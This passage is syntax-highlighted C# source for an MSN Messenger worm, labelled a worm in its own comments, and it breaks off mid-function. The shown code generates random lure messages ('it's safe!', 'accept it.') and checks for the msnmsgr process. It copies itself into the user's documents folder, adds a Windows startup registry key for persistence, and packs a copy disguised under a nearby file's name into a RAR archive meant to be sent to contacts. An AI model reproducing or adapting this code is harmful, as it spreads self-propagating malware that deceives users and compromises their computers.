            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"install"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"check out"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"try"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"look at"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"nurofen"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"this"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"that"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"my"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"the"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"a"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"program"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"software"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"app"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"application"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"game"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"it get's msn passwords!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"i need your opinion on it"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"i need someone to test it for me"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"it's safe!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"you will love it!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"it's amazing!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"it is kewl!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"accept it."</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">9</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"i made it"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"please"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">11</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"plz"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"MSN addon"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"secret MSN smilies!"</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">intro</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">scnd</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc11">thrd</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">fth</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                </span><span class="sc11">why</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">14</span><span class="sc10">)];</span><span class="sc0"> </span><span class="sc2">//generate the random IM
</span><span class="sc0">        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">MSNLoaded</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Process</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">processes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">GetProcesses</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Process</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">processes</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">pname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">ProcessName</span><span class="sc10">.</span><span class="sc11">ToLower</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pname</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">"msnmsgr"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">//name of msn messangers process in memory
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//find the WinRar program location using registry
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">GetRarPath</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tmpGetRarPath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">myReg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">myReg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">LocalMachine</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">myReg</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Application</span><span class="sc10">.</span><span class="sc11">Exit</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc5">else</span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">tmpGetRarPath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">myReg</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"Path"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\WinRar.exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">tmpGetRarPath</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//add's worm to startup key
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">start_with_windows</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">isthere</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">.</span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">nurofenModule</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">nurofenFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nurofenModule</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sFile</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//make it if it isnt there
</span><span class="sc0">                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">nurofenFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//check if its there
</span><span class="sc0">            </span><span class="sc11">isthere</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc11">subkey</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">KeyTitle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isthere</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//no?
</span><span class="sc0">                </span><span class="sc2">//then put it there lol
</span><span class="sc0">                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc11">subkey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">SetValue</span><span class="sc10">(</span><span class="sc11">KeyTitle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sFile</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//creates a rar file and a copy of itself to c:\ and sends it to msn contact
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">createRAR</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">compile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">//create byte array for rar file header
</span><span class="sc0">            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">RARArchive</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 
                </span><span class="sc4">82</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">97</span><span class="sc10">,</span><span class="sc0"> 
              </span><span class="sc4">114</span><span class="sc10">,</span><span class="sc4">33</span><span class="sc10">,</span><span class="sc0"> 
                 </span><span class="sc4">26</span><span class="sc10">,</span><span class="sc4">7</span><span class="sc10">,</span><span class="sc0"> 
              </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">207</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc4">144</span><span class="sc10">,</span><span class="sc4">115</span><span class="sc10">,</span><span class="sc0"> 
              </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">13</span><span class="sc10">,</span><span class="sc0"> 
                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> 
            </span><span class="sc10">};</span><span class="sc0">

            </span><span class="sc2">//get self exe name/location
</span><span class="sc0">            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Reflection</span><span class="sc10">.</span><span class="sc11">Module</span><span class="sc0"> </span><span class="sc11">nurofenModule</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetModules</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">nurofenFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nurofenModule</span><span class="sc10">.</span><span class="sc11">FullyQualifiedName</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//create rar file
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">(</span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"test.rar"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">RARArchive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">RARArchive</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Flush</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//get working directory
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">//get files from current location
</span><span class="sc0">            </span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getfiles</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//check if it's found any files it can use the name of
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//strip extension from file
</span><span class="sc0">                </span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rndName</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rndName</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc2">//add a .exe extension
</span><span class="sc0">                </span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//no files?
</span><span class="sc0">                </span><span class="sc2">//use this name then
</span><span class="sc0">                </span><span class="sc11">rndName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"nuro.exe"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//copy self to c:\ with the file name of a file found in the current path
</span><span class="sc0">            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">nurofenFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rndName</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//rar it! (causes error because of header, but the rar file works!)
</span><span class="sc0">            </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">.</span><span class="sc11">Process</span><span class="sc0"> </span><span class="sc11">process1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">.</span><span class="sc11">Process</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">process1</span><span class="sc10">.</span><span class="sc11">EnableRaisingEvents</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">compile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/C \""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">GetRarPath</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\" a "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"test.rar"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rndName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Process</span><span class="sc10">.</span><span class="sc11">Start</span><span class="sc10">(</span><span class="sc6">"CMD.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">compile</span><span class="sc10">).</span><span class="sc11">WaitForExit</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">process1</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//check for Previous Instance, return true or false
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Is_Active</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Mutex</span><span class="sc0"> </span><span class="sc11">nuroMutex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Mutex</span><span class="sc10">(</span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Genetix"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Running</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">nuroMutex</span><span class="sc10">.</span><span class="sc11">WaitOne</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">Running</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//used for getting a file name randomly
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">getfiles</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">filecount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//get files
</span><span class="sc0">            </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">//make array of files
